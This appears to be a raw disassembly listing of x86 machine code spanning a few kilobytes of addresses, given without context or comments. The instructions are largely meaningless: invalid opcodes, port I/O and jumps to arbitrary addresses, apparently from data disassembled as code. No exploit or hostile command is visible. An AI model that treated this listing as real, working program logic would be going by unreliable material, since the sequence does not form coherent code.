  4a3f5f:	mov    ch,BYTE PTR [esi-0x22]
  4a3f62:	cmp    DWORD PTR [ebx],0xffffff82
  4a3f65:	pop    es
  4a3f66:	jge    0x4a3f80
  4a3f68:	pop    es
  4a3f69:	je     0x4a3f7c
  4a3f6b:	dec    eax
  4a3f6c:	ds nop
  4a3f6e:	or     eax,DWORD PTR [esi]
  4a3f70:	test   DWORD PTR [esi+ebp*8-0x7b],esp
  4a3f74:	push   esp
  4a3f75:	out    dx,al
  4a3f76:	enter  0x6e1,0x70
  4a3f7a:	dec    ecx
  4a3f7b:	add    DWORD PTR [ebx-0xda411c9],ebx
  4a3f81:	add    esi,DWORD PTR [edi]
  4a3f83:	xor    ebp,DWORD PTR [ebx]
  4a3f85:	pop    es
  4a3f86:	test   DWORD PTR [ecx],esp
  4a3f88:	out    dx,al
  4a3f89:	push   ds
  4a3f8a:	add    al,0xf0
  4a3f8c:	jbe    0x4a3f56
  4a3f8e:	adc    DWORD PTR [ebp-0x20145c13],eax
  4a3f94:	mov    al,0x2f
  4a3f96:	daa    
  4a3f97:	adc    ebp,edi
  4a3f99:	add    BYTE PTR [esi+0x2847eb91],al
  4a3f9f:	mov    bl,0xe4
  4a3fa1:	bound  esp,QWORD PTR [edi-0x72cf8ffc]
  4a3fa7:	jbe    0x4a3f94
  4a3fa9:	jge    0x4a401e
  4a3fab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a3fac:	adc    eax,DWORD PTR [eax+0xc]
  4a3faf:	add    BYTE PTR [eax],bh
  4a3fb1:	jmp    0x3f6b7859
  4a3fb6:	jl     0x4a3f3f
  4a3fb8:	das    
  4a3fb9:	jmp    0x906a28dd
  4a3fbe:	scas   eax,DWORD PTR es:[edi]
  4a3fbf:	mov    BYTE PTR [ecx-0x75e2caec],dh
  4a3fc5:	add    BYTE PTR [edx],ah
  4a3fc7:	jo     0x4a3fdc
  4a3fc9:	sti    
  4a3fca:	test   DWORD PTR [esi-0x13],esi
  4a3fcd:	cmp    DWORD PTR [edx],ecx
  4a3fcf:	(bad)  
  4a3fd0:	inc    edi
  4a3fd1:	clc    
  4a3fd2:	xor    al,0xbc
  4a3fd4:	push   edi
  4a3fd5:	add    al,0x76
  4a3fd7:	std    
  4a3fd8:	jmp    0x4a4038
  4a3fda:	mov    ch,0xb7
  4a3fdc:	ja     0x4a3f66
  4a3fde:	test   BYTE PTR [edi-0x39],dl
  4a3fe1:	(bad)  
  4a3fe2:	call   0x36a98811
  4a3fe7:	and    ecx,edi
  4a3fe9:	xchg   ax,ax
  4a3feb:	in     eax,dx
  4a3fec:	add    DWORD PTR [ecx],ebp
  4a3fee:	in     eax,dx
  4a3fef:	cs daa 
  4a3ff1:	cmp    al,0x79
  4a3ff3:	and    edx,DWORD PTR ss:[eax]
  4a3ff6:	mov    bh,0xea
  4a3ff8:	sbb    BYTE PTR [edi+0xb211e8],al
  4a3ffe:	adc    DWORD PTR [eax],0xffffffe4
  4a4001:	jp     0x4a3feb
  4a4003:	sub    ah,BYTE PTR [edx+0xc]
  4a4006:	cmp    esi,esp
  4a4008:	sti    
  4a4009:	jae    0x4a4000
  4a400b:	loopne 0x4a3fcd
  4a400d:	pusha  
  4a400e:	fiadd  DWORD PTR [eax]
  4a4010:	(bad)  
  4a4012:	out    0x3c,eax
  4a4014:	push   ss
  4a4015:	dec    esi
  4a4016:	fidivr WORD PTR [ebx+0x414ceca8]
  4a401c:	push   ds
  4a401d:	mov    esp,0xc8817ae2
  4a4022:	out    0xb7,eax
  4a4024:	stos   DWORD PTR es:[edi],eax
  4a4025:	out    0xd3,eax
  4a4027:	jmp    0x4a409d
  4a4029:	xchg   ebx,eax
  4a402a:	lahf   
  4a402b:	push   ss
  4a402c:	loopne 0x4a3fea
  4a402e:	out    0x21,al
  4a4030:	in     eax,0xf2
  4a4032:	rol    DWORD PTR [esi-0x17],cl
  4a4035:	(bad)  
  4a4037:	mov    dl,0xb6
  4a4039:	jo     0x4a4065
  4a403b:	push   cs
  4a403c:	es jnp 0x4a4073
  4a403f:	pushf  
  4a4040:	in     al,0xa7
  4a4042:	stos   DWORD PTR es:[edi],eax
  4a4043:	in     al,dx
  4a4044:	enter  0xef02,0xf2
  4a4048:	xor    bl,bl
  4a404a:	hlt    
  4a404b:	add    BYTE PTR [ebx],dh
  4a404d:	addr16 cmp dh,dl
  4a4050:	jmp    0x4a4052
  4a4052:	fcmovb st,st(6)
  4a4054:	mov    eax,ds:0xa1debc8
  4a4059:	ja     0x4a404d
  4a405b:	shr    DWORD PTR [ebp+0x3b],cl
  4a405e:	out    0x32,eax
  4a4060:	adc    BYTE PTR [ebx+0x38],dl
  4a4063:	mov    al,0x53
  4a4065:	retf   
  4a4066:	daa    
  4a4067:	out    0x43,eax
  4a4069:	stos   DWORD PTR es:[edi],eax
  4a406a:	add    BYTE PTR [ebx],ah
  4a406c:	dec    ecx
  4a406d:	mov    ebx,DWORD PTR [edi+ecx*1-0x7b79ff5e]
  4a4074:	(bad)  
  4a4076:	sbb    eax,0x1189fee4
  4a407b:	jmp    0x1450c606
  4a4080:	jmp    0x4a40f5
  4a4082:	out    0xd9,eax
  4a4084:	retf   
  4a4085:	pop    ds
  4a4086:	mov    edi,0x6576e6d8
  4a408b:	xor    eax,0x8fe6c885
  4a4090:	jecxz  0x4a40cd
  4a4092:	mov    ds,WORD PTR [eax+0x7b]
  4a4095:	cmp    BYTE PTR [esi-0x32a0b615],dl
  4a409b:	call   0x3cbc1dbc
  4a40a0:	cmp    dl,BYTE PTR [ecx-0x65]
  4a40a3:	pop    ecx
  4a40a4:	sub    edi,DWORD PTR [ebx]
  4a40a6:	rcr    DWORD PTR ds:0x590b7747,1
  4a40ac:	sbb    al,0x2d
  4a40ae:	mov    al,ds:0x89c20d59
  4a40b3:	nop
  4a40b4:	(bad)  
  4a40b5:	pop    ss
  4a40b6:	outs   dx,BYTE PTR ds:[esi]
  4a40b7:	out    0x38,al
  4a40b9:	dec    BYTE PTR ds:0xd314721f
  4a40bf:	sti    
  4a40c0:	nop
  4a40c1:	jb     0x4a413a
  4a40c3:	mov    BYTE PTR [ebp+ecx*8-0x1a],bl
  4a40c7:	repz mov ah,0x7d
  4a40ca:	push   es
  4a40cb:	imul   eax,DWORD PTR [edx-0x7e298138],0xfffffff2
  4a40d2:	mov    bl,0xd9
  4a40d4:	ins    BYTE PTR es:[edi],dx
  4a40d5:	mov    dh,0x82
  4a40d7:	cs push cs
  4a40d9:	test   BYTE PTR [edx],ch
  4a40db:	test   DWORD PTR [esi-0x7a],eax
  4a40de:	bound  eax,QWORD PTR [edi+0x4f79f36d]
  4a40e4:	xor    eax,0x7ebd0688
  4a40e9:	mov    cl,bl
  4a40eb:	mov    DWORD PTR [esi+0x5f],esi
  4a40ee:	out    dx,eax
  4a40ef:	imul   esi,DWORD PTR [esi],0x8ce58b9b
  4a40f5:	and    al,0x8e
  4a40f7:	cmp    DWORD PTR [esi],ebp
  4a40f9:	push   es
  4a40fa:	shl    DWORD PTR [esi],0xdb
  4a40fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a40fe:	jge    0x4a40a6
  4a4100:	into   
  4a4101:	jl     0x4a40a1
  4a4103:	mov    eax,DWORD PTR [eax-0x68e0f96a]
  4a4109:	ins    BYTE PTR es:[edi],dx
  4a410a:	sahf   
  4a410b:	cmp    al,0xcf
  4a410d:	shr    DWORD PTR [edx+edi*8-0x67],cl
  4a4111:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a4112:	or     bl,0xda
  4a4115:	xor    al,0x9b
  4a4117:	iret   
  4a4118:	repz jmp 0xdeea87bd
  4a411e:	lahf   
  4a411f:	(bad)  
  4a4120:	jge    0x4a40c0
  4a4122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a4123:	stc    
  4a4124:	add    esp,DWORD PTR [eax+0x2b1d11]
  4a412a:	test   eax,0xed3cf3de
  4a412f:	out    dx,al
  4a4130:	test   al,0x6
  4a4132:	addr16 mov bl,0xc2
  4a4135:	rcr    DWORD PTR [esi],1
  4a4137:	loop   0x4a4114
  4a4139:	mov    bl,0xd9
  4a413b:	jl     0x4a4185
  4a413d:	xchg   ecx,eax
  4a413e:	adc    dl,BYTE PTR [ebx+eiz*2+0x780ed18f]
  4a4145:	jns    0x4a4114
  4a4147:	imul   BYTE PTR [esi+esi*1-0x2e]
  4a414b:	jp     0x4a40fb
  4a414d:	jnp    0x4a41c6
  4a414f:	es ja  0x4a41ca
  4a4152:	sbb    esi,DWORD PTR [edi+ecx*2+0x2f183cfb]
  4a4159:	retf   
  4a415a:	push   es
  4a415b:	adc    bh,dl
  4a415d:	jb     0x4a41a5
  4a415f:	jmp    0x4a41da
  4a4161:	call   0x6cd:0x233ef3ed
  4a4168:	adc    ecx,esi
  4a416a:	imul   ecx,ecx,0xfffffff7
  4a416d:	cmp    eax,0xcf2bf34f
  4a4172:	(bad)  
  4a4173:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a4175:	ss mov bh,0xd5
  4a4178:	jle    0x4a41d8
  4a417a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a417b:	icebp  
  4a417c:	jnp    0x4a410c
  4a417e:	mov    WORD PTR [esi+0x1],ss
  4a4181:	jmp    0x4a41c6
  4a4183:	jnp    0x4a4137
  4a4185:	xor    DWORD PTR [eax+0x1b88048d],edx
  4a418b:	enter  0x7c6,0x73
  4a418f:	dec    ebx
  4a4190:	dec    ebx
  4a4191:	ja     0x4a41de
  4a4193:	adc    edi,DWORD PTR [edi-0x7]
  4a4196:	jg     0x4a4197
  4a4198:	adc    al,0x15
  4a419a:	push   ss
  4a419b:	pop    ss
  4a419c:	sbb    BYTE PTR [ecx],bl
  4a419e:	sbb    bl,BYTE PTR [ebx]
  4a41a0:	add    DWORD PTR [esp+ebx*1],ebx
  4a41a3:	sbb    eax,0x21201f1e
  4a41a8:	and    ah,BYTE PTR [ebx]
  4a41aa:	and    esp,DWORD PTR [eiz*1-0x6c00da]
  4a41b1:	in     eax,0x27
  4a41b3:	sub    BYTE PTR [ecx],ch
  4a41b5:	sub    ch,BYTE PTR [edx]
  4a41b7:	sub    ebp,DWORD PTR [ebp*1+0x304b2f2e]
  4a41be:	xor    BYTE PTR [ecx],dh
  4a41c0:	xor    dh,BYTE PTR [ebx]
  4a41c2:	xor    al,0x35
  4a41c4:	push   DWORD PTR ss:[edi-0x21]
  4a41c8:	ss aaa 
  4a41ca:	cmp    BYTE PTR [edx],al
  4a41cc:	cmp    DWORD PTR [edx],edi
  4a41ce:	cmp    edi,DWORD PTR [edi*1+0x3f3e3504]
  4a41d5:	inc    eax
  4a41d6:	inc    ecx
  4a41d7:	inc    edx
  4a41d8:	inc    ebx
  4a41d9:	inc    esp
  4a41da:	dec    eax
  4a41db:	mov    edx,0x4645ff83
  4a41e0:	inc    edi
  4a41e1:	dec    eax
  4a41e2:	add    BYTE PTR [ecx+0x4a],cl
  4a41e5:	nop
  4a41e6:	sar    DWORD PTR [esi+0x49cd06f0],0xb6
  4a41ed:	push   edi
  4a41ee:	outs   dx,DWORD PTR ds:[esi]
  4a41ef:	outs   dx,BYTE PTR ds:[esi]
  4a41f0:	xchg   ecx,eax
  4a41f1:	push   ds
  4a41f2:	mov    eax,ds:0x6e944291
  4a41f7:	lahf   
  4a41f8:	jbe    0x4a426b
  4a41fa:	xchg   edx,eax
  4a41fb:	xchg   esp,eax
  4a41fc:	dec    edi
  4a41fd:	mov    cl,0x46
  4a41ff:	mov    dl,0x6
  4a4201:	ret    
  4a4202:	adc    BYTE PTR [ebx+0x34f3e69f],dh
  4a4208:	push   esi
  4a4209:	mov    ds:0x30eda959,eax
  4a420e:	stos   BYTE PTR es:[edi],al
  4a420f:	ins    BYTE PTR es:[edi],dx
  4a4210:	ss inc edi
  4a4212:	ss xchg esp,esp
  4a4215:	inc    esp
  4a4216:	stos   BYTE PTR es:[edi],al
  4a4217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a4218:	stos   DWORD PTR es:[edi],eax
  4a4219:	lods   eax,DWORD PTR ds:[esi]
  4a421b:	sahf   
  4a421c:	data16 mov bl,0xd9
  4a421f:	lds    ebp,FWORD PTR [esi-0x49d74ff1]
  4a4225:	fs lahf 
  4a4227:	jge    0x4a4278
  4a4229:	repz jns 0x4a4207
  4a422c:	adc    esi,DWORD PTR [edi+0x7586f948]
  4a4232:	mov    ah,0x9e
  4a4234:	test   BYTE PTR [ebp-0x4e],0x7e
  4a4238:	mov    DWORD PTR [ebp+ebx*4+0x6b50016],esi
  4a423f:	dec    esp
  4a4240:	xchg   esp,eax
  4a4241:	ds dec edi
  4a4243:	repz jns 0x4a4220
  4a4246:	lock mov ah,0xe6
  4a4249:	fstp   DWORD PTR [ebx-0x2d]
  4a424c:	daa    
  4a424d:	test   al,0x1d
  4a424f:	sbb    al,0x6f
  4a4251:	jo     0x4a4254
  4a4253:	add    DWORD PTR [ebp+0x36],edx
  4a4256:	fwait
  4a4257:	int    0x82
  4a4259:	mov    esi,0xcfbf9e96
  4a425e:	rcr    BYTE PTR [esi],0xc2
  4a4261:	jae    0x4a4226
  4a4263:	fs mov bl,0xd9
  4a4266:	ins    BYTE PTR es:[edi],dx
  4a4267:	mov    esi,0xab7b2c4
  4a426c:	mov    ecx,0xe473b979
  4a4271:	in     al,dx
  4a4272:	fwait
  4a4273:	mov    bh,0x16
  4a4275:	aas    
  4a4276:	mov    ebx,0xfabce507
  4a427b:	enter  0x79f3,0x9e
  4a427f:	data16 das 
  4a4281:	leave  
  4a4282:	ins    BYTE PTR es:[edi],dx
  4a4283:	mov    eax,ds:0xbdca05d9
  4a4288:	arpl   bx,cx
  4a428a:	pushfw 
  4a428c:	(bad)  
  4a428d:	xor    eax,0x16737fc7
  4a4292:	clc    
  4a4293:	imul   edi,DWORD PTR [esi],0x3606f34f
  4a4299:	enter  0xbc6e,0x29
  4a429d:	call   0x9ec426e8
  4a42a2:	out    0x60,eax
  4a42a4:	jbe    0x4a4236
  4a42a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a42a7:	mov    esi,0xb61da7cd
  4a42ac:	jg     0x4a42ec
  4a42ae:	out    0x6,al
  4a42b0:	mov    ds:0x9eabe727,eax
  4a42b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a42b6:	stc    
  4a42b7:	cmp    al,0xea
  4a42b9:	jb     0x4a42a5
  4a42bb:	adc    DWORD PTR [eax-0x186d2761],0xcabdae79
  4a42c5:	jg     0x4a4290
  4a42c7:	repz sahf 
  4a42c9:	jbe    0x4a427e
  4a42cb:	jmp    0x3e6136d6
  4a42d0:	cmp    BYTE PTR [edi+0x62],dl
  4a42d3:	push   ebp
  4a42d4:	adc    eax,0xcd26e5df
  4a42d9:	jmp    0x7e5053f5
  4a42de:	or     BYTE PTR [ebx-0x14],cl
  4a42e1:	push   esp
  4a42e2:	push   esi
  4a42e3:	and    al,0xbc
  4a42e5:	xchg   edx,eax
  4a42e6:	icebp  
  4a42e7:	inc    ebp
  4a42e8:	cmp    bl,BYTE PTR [ecx+eax*4]
  4a42eb:	cmp    BYTE PTR [esi+eiz*1+0x21773d52],cl
  4a42f2:	adc    dl,BYTE PTR [ecx-0x28]
  4a42f5:	fcmovb st,st(6)
  4a42f7:	xor    eax,0x61f3d84e
  4a42fc:	inc    eax
  4a42fd:	das    
  4a42fe:	sbb    DWORD PTR [edi],ebx
  4a4300:	sar    ch,0xa
  4a4303:	mov    eax,0x4ff106b8
  4a4308:	push   ebx
  4a4309:	add    esi,DWORD PTR [edi-0x6f0fefc0]
  4a430f:	hlt    
  4a4310:	sahf   
  4a4311:	push   0x19
  4a4313:	dec    ecx
  4a4314:	xchg   DWORD PTR [ebp+edx*2+0x60eb45cb],eax
  4a431b:	push   esp
  4a431c:	rol    BYTE PTR [eax-0x46fa6f22],0x85
  4a4323:	adc    DWORD PTR [edx-0x5b7c50f4],ebx
  4a4329:	lea    ebp,[ebx]
  4a432b:	loop   0x4a439b
  4a432d:	fucom  st(4)
  4a432f:	xchg   esi,eax
  4a4330:	xor    edi,0xffffffdc
  4a4333:	push   edx
  4a4334:	sar    dl,cl
  4a4336:	inc    esp
  4a4337:	sbb    DWORD PTR [edi+0xc7f43f0],ecx
  4a433d:	mov    edx,0x33d44bfb
  4a4342:	rcl    dl,cl
  4a4344:	xchg   esp,eax
  4a4345:	ret    0x5752
  4a4348:	add    ebx,edi
  4a434a:	iret   
  4a434b:	inc    ebp
  4a434c:	and    dh,BYTE PTR [esi+0x6780d96]
  4a4352:	idiv   BYTE PTR [ecx-0x52]
  4a4355:	jmp    0x4a43b1
  4a4357:	push   edx
  4a4358:	xchg   ebp,eax
  4a4359:	mov    eax,ds:0x822eb632
  4a435e:	add    DWORD PTR [ebp+0x7c39b0],esi
  4a4364:	aad    0xfa
  4a4366:	cmc    
  4a4367:	(bad)  
  4a4369:	cmp    BYTE PTR [ecx],dl
  4a436b:	test   BYTE PTR [edi],0x94
  4a436e:	jo     0x4a437f
  4a4370:	inc    ebp
  4a4371:	inc    eax
  4a4372:	gs je  0x4a4314
  4a4375:	jmp    0x4a4301
  4a4377:	test   BYTE PTR [ebx-0x7f75f77f],ah
  4a437d:	shl    BYTE PTR [eax],cl
  4a437f:	shr    BYTE PTR [eax+0x12],1
  4a4382:	iret   
  4a4383:	push   esp
  4a4384:	mov    al,cl
  4a4386:	and    DWORD PTR [ecx+0x4e],esp
  4a4389:	xor    eax,0x9ef3cec1
  4a438e:	cmp    dl,ch
  4a4390:	cmp    BYTE PTR [esi],al
  4a4392:	or     eax,0x31120030
  4a4397:	fdiv   st,st(2)
  4a4399:	cmp    BYTE PTR [eax],al
  4a439b:	add    BYTE PTR [esi],cl
  4a439d:	fwait
  4a439e:	mov    WORD PTR [edx+edx*4],cs
  4a43a1:	cs mov eax,ecx
  4a43a4:	cmp    al,0x80
  4a43a6:	je     0x4a43a9
  4a43a8:	xchg   ecx,eax
  4a43a9:	or     cl,dh
  4a43ab:	pop    es
  4a43ac:	imul   edx,DWORD PTR [ebx],0xffffffca
  4a43af:	and    eax,0xf84e574b
  4a43b4:	loopne 0x4a43f6
  4a43b6:	iret   
  4a43b7:	xor    dl,BYTE PTR ds:0x299dc38b
  4a43bd:	loope  0x4a43ce
  4a43bf:	adc    bh,al
  4a43c1:	pusha  
  4a43c2:	jne    0x4a441a
  4a43c4:	scas   eax,DWORD PTR es:[edi]
  4a43c5:	push   ebx
  4a43c6:	sbb    esp,DWORD PTR [ebx+ebp*1-0x51f929b7]
  4a43cd:	fs jb  0x4a4428
  4a43d0:	sbb    bl,cl
  4a43d2:	clc    
  4a43d3:	add    al,0x3c
  4a43d5:	push   0xf4187d76
  4a43da:	push   ds
  4a43db:	push   eax
  4a43dc:	fcmove st,st(1)
  4a43de:	loopne 0x4a43b0
  4a43e0:	arpl   WORD PTR [ebx-0x61],bp
  4a43e3:	jnp    0x4a4454
  4a43e5:	sub    dl,BYTE PTR [ebx+esi*2+0x5688b76a]
  4a43ec:	mov    ch,0x19
  4a43ee:	mov    bh,0xdf
  4a43f0:	pop    ss
  4a43f1:	pop    esi
  4a43f2:	jne    0x4a43fb
  4a43f4:	mov    ebp,ebx
  4a43f6:	and    edx,DWORD PTR [esi]
  4a43f8:	pop    edi
  4a43f9:	jne    0x4a442d
  4a43fb:	push   ebp
  4a43fc:	pop    edx
  4a43fd:	inc    edi
  4a43fe:	rcl    ah,1
  4a4400:	test   eax,0xed25b850
  4a4405:	dec    DWORD PTR [ecx]
  4a4407:	and    BYTE PTR gs:[ebp+0x2],bh
  4a440b:	shl    eax,cl
  4a440d:	or     eax,DWORD PTR [ebp-0x2c]
  4a4410:	push   eax
  4a4411:	or     eax,0x4675e944
  4a4417:	div    DWORD PTR [edi]
  4a4419:	aaa    
  4a441a:	mov    bh,0x6f
  4a441c:	scas   al,BYTE PTR es:[edi]
  4a441d:	sub    BYTE PTR [eax],cl
  4a441f:	pop    ebp
  4a4420:	je     0x4a4445
  4a4422:	cmp    DWORD PTR [ecx+edx*1+0x3a],esi
  4a4426:	je     0x4a4434
  4a4428:	int    0xff
  4a442a:	aaa    
  4a442b:	aaa    
  4a442c:	inc    edx
  4a442d:	je     0x4a4436
  4a442f:	sbb    dh,BYTE PTR [ebp-0x25]
  4a4432:	jmp    0x4a4453
  4a4434:	cmp    BYTE PTR [esi+0x1],0xc
  4a4438:	jne    0x4a440d
  4a443a:	test   DWORD PTR [ebp-0x32],ebx
  4a443d:	nop
  4a443e:	add    al,BYTE PTR [ebx]
  4a4440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a4441:	jmp    0x4a4407
  4a4443:	pusha  
  4a4444:	push   ecx
  4a4445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4446:	or     BYTE PTR [edx+0x1b],al
  4a4449:	mov    edx,0x477c57d8
  4a444e:	adc    ch,BYTE PTR [esi]
  4a4450:	sub    al,0x7d
  4a4452:	cli    
  4a4453:	cmp    BYTE PTR [edi],0x54
  4a4456:	dec    ecx
  4a4457:	pop    ebx
  4a4458:	mov    eax,0x5ff3cc23
  4a445d:	adc    al,0xd8
  4a445f:	sbb    al,0xc
  4a4461:	aaa    
  4a4462:	xor    eax,0x56025d90
  4a4467:	push   ecx
  4a4468:	adc    ebx,DWORD PTR [edx-0x5e8e1efa]
  4a446e:	stc    
  4a446f:	add    eax,0x2d7203a6
  4a4474:	imul   ebp,ebx,0xba33dc21
  4a447a:	inc    esi
  4a447b:	pop    es
  4a447c:	cmp    eax,DWORD PTR ds:0x440be29d
  4a4482:	jb     0x4a44f5
  4a4484:	fmul   QWORD PTR [ecx+eax*8]
  4a4487:	enter  0xffe1,0x5b
  4a448b:	lahf   
  4a448c:	stc    
  4a448d:	cmp    al,0x83
  4a448f:	stc    
  4a4490:	out    0xe6,al
  4a4492:	out    0xd6,al
  4a4494:	aaa    
  4a4495:	adc    ah,BYTE PTR [eax+0x74]
  4a4498:	xor    bh,BYTE PTR [ecx]
  4a449a:	je     0x4a44bc
  4a449c:	cmp    dh,BYTE PTR [ebx+ebx*1+0x30]
  4a44a0:	jmp    esi
  4a44a2:	out    0x42,al
  4a44a4:	je     0x4a44bc
  4a44a6:	add    DWORD PTR [ecx+esi*1+0x2],esi
  4a44aa:	je     0x4a44d8
  4a44ac:	test   BYTE PTR [esi],0x2
  4a44af:	jne    0x4a447d
  4a44b1:	mov    si,0x2ff9
  4a44b5:	mov    bh,0xeb
  4a44b8:	and    BYTE PTR [eax+0x750d0178],al
  4a44be:	mov    edi,0xebba7510
  4a44c3:	adc    esi,DWORD PTR [ebx+eax*1+0x5192c148]
  4a44ca:	enter  0x35a5,0xbc
  4a44ce:	add    al,0xb4
  4a44d0:	nop
  4a44d1:	jmp    FWORD PTR [edi+0x18]
  4a44d4:	push   es
  4a44d5:	push   es
  4a44d6:	fwait
  4a44d7:	sub    BYTE PTR [ebx],bh
  4a44d9:	int3   
  4a44da:	push   ebx
  4a44db:	inc    edx
  4a44dc:	icebp  
  4a44dd:	inc    ebx
  4a44de:	cmc    
  4a44df:	or     DWORD PTR [esi+edi*8+0x14a8fe60],0x69
  4a44e7:	xchg   edi,eax
  4a44e8:	or     cl,bl
  4a44ea:	add    BYTE PTR [ebx+0xc],al
  4a44ed:	test   BYTE PTR [ecx+ebp*4],0x42
  4a44f1:	pop    ss
  4a44f2:	mov    ebx,0xe7127438
  4a44f7:	sub    al,0x46
  4a44f9:	and    al,0x29
  4a44fb:	in     al,dx
  4a44fc:	das    
  4a44fd:	mov    BYTE PTR [ebp-0xb],dh
  4a4500:	mov    DWORD PTR [esi-0x1c],edi
  4a4503:	loope  0x4a457f
  4a4505:	adc    ebx,DWORD PTR [ebx]
  4a4507:	test   BYTE PTR [edi+0xa],ah
  4a450a:	lahf   
  4a450b:	inc    esi
  4a450c:	push   ds
  4a450d:	pop    ds
  4a450e:	and    al,0xdd
  4a4510:	inc    ecx
  4a4511:	xor    dh,cl
  4a4513:	mov    ecx,DWORD PTR [ebx+0x7e]
  4a4516:	es mov esi,edi
  4a4519:	or     edi,ecx
  4a451b:	lahf   
  4a451c:	inc    ebx
  4a451d:	cmp    eax,0x520c558b
  4a4522:	lea    edx,[ebx+0x26]
  4a4525:	add    esi,DWORD PTR [ebx+0x5c]
  4a4528:	pop    esp
  4a4529:	jb     0x4a44ae
  4a452b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a452c:	fucomi st,st(3)
  4a452e:	mov    eax,ds:0x538b5c58
  4a4533:	pop    edi
  4a4534:	inc    ebx
  4a4535:	mov    bh,0x85
  4a4537:	aaa    
  4a4538:	xor    esp,edx
  4a453a:	sbb    BYTE PTR [ecx+0x74],ah
  4a453d:	fiadd  DWORD PTR [esi-0x48]
  4a4540:	fsubr  st(1),st
  4a4542:	add    BYTE PTR [esi+0x3519744e],bh
  4a4548:	jp     0xdbeedb4c
  4a454e:	add    DWORD PTR ds:0x6c1d0b34,ebp
  4a4554:	push   ebp
  4a4555:	mov    ds:0x2ae3148c,al
  4a455a:	(bad)  
  4a455b:	cdq    
  4a455c:	xor    dl,ah
  4a455e:	pusha  
  4a455f:	clc    
  4a4560:	neg    dl
  4a4562:	xor    al,0x7
  4a4564:	dec    edi
  4a4565:	and    BYTE PTR [eax+0x5f],bh
  4a4568:	push   ss
  4a4569:	mov    eax,DWORD PTR [ecx+0x7e]
  4a456c:	add    cl,BYTE PTR [edi]
  4a456e:	inc    ecx
  4a456f:	in     al,0x83
  4a4571:	test   DWORD PTR [ecx-0x41],edi
  4a4574:	add    DWORD PTR [edx-0x4c],esi
  4a4577:	add    BYTE PTR [esi-0x40],0xd4
  4a457b:	sub    edx,DWORD PTR [ecx+0x7a]
  4a457e:	rol    BYTE PTR [edx+0x49f7d455],cl
  4a4584:	lods   eax,DWORD PTR ds:[esi]
  4a4585:	inc    ecx
  4a4586:	sbb    al,0x20
  4a4588:	jae    0x4a4523
  4a458a:	or     al,0x9
  4a458c:	add    al,0x82
  4a458e:	mov    esi,0x5cc183d2
  4a4593:	add    al,0x91
  4a4595:	aaa    
  4a4596:	pop    ds
  4a4597:	or     esi,DWORD PTR [eax+0x1d]
  4a459a:	std    
  4a459b:	push   edx
  4a459c:	add    DWORD PTR [ecx+0x5c],esi
  4a459f:	jmp    0x4a45b0
  4a45a1:	and    eax,0x74948415
  4a45a6:	popf   
  4a45a7:	add    BYTE PTR [edx-0x28],0xc0
  4a45ab:	ins    BYTE PTR es:[edi],dx
  4a45ac:	scas   al,BYTE PTR es:[edi]
  4a45ad:	mov    DWORD PTR [ecx],ecx
  4a45af:	jnp    0x4a453c
  4a45b1:	fdivr  DWORD PTR [ebp-0x46980b7a]
  4a45b7:	inc    esi
  4a45b8:	cmp    ebx,0xa7d25ac9
  4a45be:	pop    ss
  4a45bf:	lock sbb dh,dh
  4a45c2:	ret    
  4a45c3:	fidiv  WORD PTR [eax]
  4a45c5:	jecxz  0x4a45e6
  4a45c7:	and    al,0x6b
  4a45c9:	mov    al,0xc3
  4a45cb:	iret   
  4a45cc:	add    edx,0x2e
  4a45cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a45d0:	jb     0x4a45b7
  4a45d2:	rol    DWORD PTR [ebx-0x1d],cl
  4a45d5:	xadd   ebx,esp
  4a45d8:	fld    st(1)
  4a45da:	jecxz  0x4a45b6
  4a45dc:	jecxz  0x4a45e0
  4a45de:	into   
  4a45df:	in     eax,dx
  4a45e0:	jecxz  0x4a45a5
  4a45e2:	jl     0x4a45ec
  4a45e4:	jne    0x4a4616
  4a45e6:	jne    0x4a459e
  4a45e8:	mov    ah,dl
  4a45ea:	mov    ch,0x3f
  4a45ec:	pop    edx
  4a45ed:	pop    es
  4a45ee:	(bad)  
  4a45ef:	ret    
  4a45f0:	arpl   sp,di
  4a45f2:	fs dec eax
  4a45f4:	imul   ebp,DWORD PTR ds:[eax+0x3],0x33c7504
  4a45fc:	shr    BYTE PTR [ebp-0x7eaef2da],cl
  4a4602:	add    al,0x82
  4a4604:	push   ss
  4a4605:	stos   BYTE PTR es:[edi],al
  4a4606:	ret    
  4a4607:	xchg   edx,eax
  4a4608:	loope  0x4a467a
  4a460a:	add    DWORD PTR [edi],esp
  4a460c:	ins    DWORD PTR es:[edi],dx
  4a460d:	mov    dl,0x74
  4a460f:	pop    ss
  4a4610:	push   cs
  4a4611:	xchg   edx,eax
  4a4612:	leave  
  4a4613:	test   DWORD PTR [ebp+0x4a],ebp
  4a4616:	imul   edi,DWORD PTR [ebx+0x37272fd9],0x15
  4a461d:	xchg   BYTE PTR [ebp-0x1f41fa76],ah
  4a4623:	dec    ecx
  4a4624:	retf   0xf13b
  4a4627:	imul   esp,DWORD PTR [ecx+0x77800fe2],0xe6413a1a
  4a4631:	adc    eax,0xad561057
  4a4636:	test   DWORD PTR [edx-0x2daebfea],edi
  4a463c:	cli    
  4a463d:	loop   0x4a45f3
  4a463f:	popa   
  4a4640:	push   ss
  4a4641:	scas   al,BYTE PTR es:[edi]
  4a4642:	div    DWORD PTR [esp+edx*1-0x6d]
  4a4646:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4647:	push   ebp
  4a4648:	test   bl,dh
  4a464a:	in     eax,dx
  4a464b:	dec    ecx
  4a464c:	push   0x52eee807
  4a4651:	dec    eax
  4a4652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a4653:	aam    0x4c
  4a4655:	sub    ah,BYTE PTR [esi+0x18]
  4a4658:	jmp    0x6aa28e11
  4a465d:	aas    
